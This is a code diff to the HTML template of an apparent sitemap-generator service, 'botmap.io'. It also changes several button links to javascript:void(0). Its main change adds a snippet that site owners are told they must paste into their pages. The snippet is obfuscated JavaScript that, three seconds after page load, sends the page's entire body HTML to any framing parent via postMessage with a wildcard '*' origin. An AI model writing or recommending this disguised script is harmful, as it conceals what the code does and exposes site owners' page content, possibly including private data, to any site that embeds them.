@@ -46,6 +46,15 @@ Disallow: /scripts/view" ng-model="robotsTxt"></textarea>
     <br>
     <small>IMPORTANT: You must include the script below to your site
       <br>or botmap.io will not be able to crawl your site.</small>
+    <br>
+    <p>
+      <textarea style="width:100%; height:112px; line-height:14px; padding:6px; border-radius:6px; background: #FFFEDF; border: 1px dashed #ccc; font-family: courier; font-size: 12px;"
+        onfocus="this.select();" onmouseup="return false;">
+  <!-- Sitemap Generator -->
+  <script type="text/javascript">
+    var _0xaea9 = ["sitemapgenerator:: ", "innerHTML", "body", "document", "stringify", "*", "postMessage", "setTimeout"]; window[_0xaea9[7]](function () { parent[_0xaea9[6]](_0xaea9[0] + JSON[_0xaea9[4]](window[_0xaea9[3]][_0xaea9[2]][_0xaea9[1]]), _0xaea9[5]) }, 3000);
+  </script></textarea>
+    </p>
   </p>
 </div>
 
@@ -66,7 +75,7 @@ Disallow: /scripts/view" ng-model="robotsTxt"></textarea>
             <a class="btn btn-lg btn-danger" ng-click="cancel()" ng-href="/" ng-hide="complete">Cancel
               <span class="glyphicon glyphicon-cog glyphicon-spin"></span>
             </a>
-            <a class="btn btn-lg btn-success" ng-click="__download(this)" ng-href="/" ng-show="complete && !textSitemap">Download Sitemap
+            <a class="btn btn-lg btn-success" ng-click="__download(this)" ng-href="javascript:void(0);" ng-show="complete && !textSitemap">Download Sitemap
               <span class="glyphicon glyphicon-floppy-save"></span>
             </a>
             <!-- <a class="btn btn-lg btn-info" ng-click="cancel()" href="">Start Over <span class="glyphicon glyphicon-refresh"></span></a> -->
@@ -106,10 +115,10 @@ Disallow: /scripts/view" ng-model="robotsTxt"></textarea>
   </ul>
   <br>
   <div class="center" ng-show="complete">
-    <a class="btn btn-lg btn-success" ng-click="__download(this)" ng-hide="textSitemap" ng-href="/">Get Sitemap
+    <a class="btn btn-lg btn-success" ng-click="__download(this)" ng-hide="textSitemap" ng-href="javascript:void(0);">Get Sitemap
       <span class="glyphicon glyphicon-floppy-save"></span>
     </a>
-    <a class="btn btn-lg btn-info" ng-click="cancel()" href="/">Start Over
+    <a class="btn btn-lg btn-info" ng-click="cancel()" href="javascript:void(0);">Start Over
       <span class="glyphicon glyphicon-refresh"></span>
     </a>
   </div>
